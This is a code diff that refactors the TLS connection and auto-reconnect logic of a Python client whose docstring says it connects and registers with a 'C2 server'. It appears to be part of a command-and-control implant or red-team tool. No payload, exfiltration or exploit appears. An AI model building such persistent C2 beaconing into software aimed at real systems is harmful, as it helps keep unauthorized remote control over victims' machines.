@@ -14,15 +14,23 @@ class ConnectionManager:
         self.client_id = client_id
         self.reader = None
         self.writer = None
-        self._running = True
+        self._connected_event = asyncio.Event()
+        self._reconnection_task = None
+        self._should_stop = False
+    
+    @property
+    def is_connected(self):
+        return self.reader is not None and self.writer is not None
+    
+    async def wait_connected(self):
+        """Wait until connection is established"""
+        await self._connected_event.wait()
         
     async def _open_connection(self) -> bool:
         """
         Connect to C2 server and register
         """
         try:
-            if not self._running:
-                return False
             ssl_ctx = TLSSessionHelper().create_context(
                 is_server=False,
             )
@@ -31,6 +39,7 @@ class ConnectionManager:
                 self.server_port,
                 ssl=ssl_ctx,
             )
+            self._connected_event.set()
             logger.info(f"Connected to server at {self.server_host}:{self.server_port}")
             return True
         except ConnectionRefusedError:
@@ -44,6 +53,7 @@ class ConnectionManager:
             return False
     
     async def _clear_connection(self):
+        self._connected_event.clear()
         try:
             if self.writer and not self.writer.is_closing():
                 self.writer.close()
@@ -55,37 +65,51 @@ class ConnectionManager:
             self.reader = None
             self.writer = None
 
-    async def reconnection_loop(self):
+    async def _reconnection_loop(self):
         """
-        Auto-reconnect logic
-        Attempts to reconnect every 1 second if disconnected
+        Background reconnection loop - runs continuously
         """
         try:
             reconnect_delay = 1
-        
-            await self._clear_connection()
-            while self._running:
-                if self.reader and self.writer:
-                    logger.info('reader/writer exists - no reconnection needed')
-                    return
-                
-                if await self._open_connection():
-                    return
-                
-                logger.info(f"Attempting to reconnect in {reconnect_delay}s...")
-                await asyncio.sleep(reconnect_delay)
             
+            while not self._should_stop:
+                if not self.is_connected:
+                    logger.info("Connection lost, attempting to reconnect...")
+                    await self._clear_connection()
+                    
+                    if await self._open_connection():
+                        logger.info("Reconnection successful")
+                    else:
+                        await asyncio.sleep(reconnect_delay)
+                else:
+                    await asyncio.sleep(1)  # Check connection status periodically
+                    
         except asyncio.CancelledError:
-            logger.info("Reconnect loop cancelled")
-            await self._clear_connection()
+            logger.info("Reconnection loop cancelled")
             raise
         except Exception as e:
-            logger.error(f"Reconnect loop error: {e}")
-            await self._clear_connection()
+            logger.error(f"Reconnection loop error: {e}")
             raise
+        finally:
+            await self._clear_connection()
+
+    async def start(self):
+        """Start connection manager with background reconnection"""
+        if self._reconnection_task:
+            logger.warning("Connection manager already started")
+            return
+        
+        self._reconnection_task = asyncio.create_task(self._reconnection_loop(), name='reconnection')
+        await self.wait_connected()  # Wait for initial connection
 
     async def close(self):
-        self._running = False
+        self._should_stop = True
+        if self._reconnection_task:
+            self._reconnection_task.cancel()
+            try:
+                await self._reconnection_task
+            except asyncio.CancelledError:
+                pass
         await self._clear_connection()
 
     @property
